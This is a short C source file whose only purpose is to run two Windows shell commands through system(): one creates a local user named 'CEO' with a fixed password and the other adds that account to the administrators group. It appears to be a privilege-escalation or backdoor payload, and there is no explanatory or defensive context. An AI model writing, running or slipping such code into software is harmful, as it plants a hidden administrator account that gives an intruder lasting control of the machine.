#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user CEO passsword123 /add");
  i = system ("net localgroup administrators CEO /add");
  
  return 0;
}
